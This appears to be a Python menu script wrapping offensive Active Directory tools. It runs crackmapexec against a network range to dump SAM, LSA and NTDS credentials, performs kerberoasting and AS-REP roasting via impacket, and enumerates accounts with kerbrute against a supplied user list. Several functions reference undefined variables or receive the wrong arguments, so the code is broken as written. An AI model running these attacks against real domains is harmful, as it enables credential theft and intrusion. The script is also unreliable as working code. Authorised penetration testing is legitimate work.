import os
import subprocess
import sys
import re
from datetime import datetime

# Change this path by running "which crackmapexec" and replace below
CME_PATH = "/home/cb/.local/bin/crackmapexec"

# This checks to see if the files below exists and deletes them as they will be part of the output file with a IP and DTG
def delete_file(filename):
    """kerberoast_hash.txt"""
    """asreproast_hash.txt"""
    try:
        os.remove(filename)
    except OSError:
        pass

# Installs Seclists, crackmapexec, impacket, and downloads kerbrute to the local folder
def install_packages():
    # seclists
    subprocess.run(['sudo', 'apt', 'install', 'seclists', '-y'])
    # crackmapexec
    subprocess.run(['sudo', 'apt', 'install', 'crackmapexec', '-y'])
    # impacket
    subprocess.run(['sudo', 'apt', 'install', 'python3-impacket', '-y'])
    # Check for kerbrute
    if not os.path.exists('kerbrute_linux_amd64'):
        subprocess.run(['wget', 'https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64'])
        subprocess.run(['chmod', '+x', 'kerbrute_linux_amd64'])
        print("Kerbrute has been installed.")
    else:
        print("Kerbrute is already downloaded.")

# Creates a standard filename for the functions
def generate_single_filename(ip):
    # Replace slashes with underscores
    ip = ip.replace("/", "_")
    return f"{ip}_{datetime.now().strftime('%d_%b_%Y_%H%M')}.txt"



def perform_kerberos(target, username, password, dc_ip, user_list_path=None):
    with open("/etc/hosts", "a") as hosts_file:
        hosts_file.write(f"{dc_ip}{' '*7}{target}\n")
    
    with open(output_filename, "a") as f:
        if user_list_path:
            subprocess.run(["impacket-GetNPUsers", "-usersfile", user_list_path, "-dc-ip", dc_ip, "-request", f"{target}/", "-format", "hashcat"], stdout=output)
        subprocess.run(["impacket-GetUserSPNs", f"{target}/{username}:{password}", "-dc-ip", dc_ip, "-request"], stdout=output)

def execute_kerbrute(dc_ip, domain_name, output_filename):
    print("1. Use built-in user list")
    print("2. Use custom user list")
    choice = input("Choose an option (1/2): ")

    if choice == '1':
        user_list_path = '/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt'
    else:
        user_list_path = input("Enter the path to your user list: ")

    subprocess.run(['./kerbrute_linux_amd64', 'userenum', '--dc', dc_ip, '-d', domain_name, user_list_path])

def execute_crackmapexec(cidr_range, domain_name, output_filename):
    # Creates an empty file
    if not os.path.exists(output_filename):
        with open(output_filename, 'w') as f:
            pass

    with open(output_filename, 'a') as f:	
        known_username = input("Do you know the username? (yes/no): ").strip().lower()
        if known_username == 'yes':
            username = input("Please enter the username for CrackMapExec: ").strip()
        else:
            username_list_path = input("Enter the path to your username list? ").strip()
            username = f" {username_list_path}"

    known_password = input("Do you know the password? (yes/no): ").strip().lower()
    if known_password == 'yes':
        password = input("Please enter the password for CrackMapExec: ").strip()
    else:
        password_list_path = input("Enter the path to your password list? ").strip()
        password = f" {password_list_path}"
    
    
     # SMB command and flags
    smb_base_command = [CME_PATH, 'smb', cidr_range, '-u', username, '-p', password]
    smb_cme_flags = [
        '--shares', '--pass-pol', '--users', '--sam --continue-on-success', '--sam',
        '--lsa --continue-on-success', ' --lsa', '--ntds --continue-on-success',
        '--ntds vss --continue-on-success' , '--ntds'
    ]

    # LDAP command and flags
    ldap_base_command = [CME_PATH, 'ldap', cidr_range, '-u', username, '-p', password]
    ldap_cme_flags = [
        '--asreproast asreproast_hash.txt', '--kerberoasting kerberoast_hash.txt'
    ]

  

    with open(output_filename, 'a') as f:
    	# Run SMB commands
    	for flags in smb_cme_flags:
            command = smb_base_command + flags.split()
            print("Executing SMB command:", ' '.join(command))
            #use the below if if the new doesnt work
            #subprocess.run(command, stdout=f, input="\n", text=True)  # This presses enter after every command
            result = subprocess.run(command, stdout=subprocess.PIPE, input="\n", text=True)
            
            # Write the output to file and check for patterns
            f.write(result.stdout)
            if "Pwn3d!" in result.stdout or "[*]" in result.stdout or "[+]" in result.stdout:
                print(result.stdout)  # This will print the matching lines to the console

    with open(output_filename, 'a') as f:
        # Run LDAP commands
        for flags in ldap_cme_flags:
            command = ldap_base_command + flags.split()
            print("Executing LDAP command:", ' '.join(command))
            subprocess.run(command, stdout=f, input="\n", text=True)  # This presses enter after every command
            if "asreproast asreproast_hash.txt" in flags:
                delete_file("asreproast_hash.txt")
            if "kerberoasting kerberoast_hash.txt" in flags:
                delete_file("kerberoast_hash.txt")
    
    return cidr_range

def main_menu():
    print("\n--------- Active Directory Penetration Testing Tools ---------")
    print("0. Install packages - Seclists, Crackmapexec, Kerbrute, Impacket")
    print("1. Crackmapexec - Enumeration of Domain Controller")
    print("2. Kerbrute - Enumerate valid AD accounts via Kerberos Pre-Authentication")
    print("3. Impacket")
    print("4. Exit")
    try:
        choice = input("Select an option (0-4): ")
    except EOFError:
        print("Unexpected end of input detected. Exiting program.")
        sys.exit(1)

    if choice == "0":
        install_packages()
    elif choice == "1":
        domain_name = input("Please enter the domain name: ")
        cidr_range = input("Please provide a CIDR range for enumeration: ")
        output_filename = generate_single_filename(cidr_range)  # use cidr_range instead of entered_ip
        entered_ip = execute_crackmapexec(cidr_range, domain_name, output_filename)

    elif choice == "2":
        dc_ip = input("Please enter the DC IP: ")
        domain_name = input("Please enter the domain name: ")
        execute_kerbrute(dc_ip, domain_name, output_filename)
    elif choice == "3":
        dc_ip = input("Please enter the DC IP: ")
        domain_name = input("Please enter the domain name: ")
        kerberos_username = input("Please enter the username for the Kerberos attack: ")
        kerberos_password = input("Please enter the password for the Kerberos attack: ")
        user_list_path = input("Enter the path to user list (or 'None' if not applicable): ")
        user_list_path = None if user_list_path.lower() == 'none' else user_list_path
        perform_kerberos(domain_name, kerberos_username, kerberos_password, dc_ip, user_list_path, output_filename)
    elif choice == "4":
        sys.exit(0)
    else:
        print("Invalid choice! Please select a valid option.")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("This script requires elevated permissions. Please run with sudo.")
        sys.exit(1)
    
    
    while True:
        main_menu()
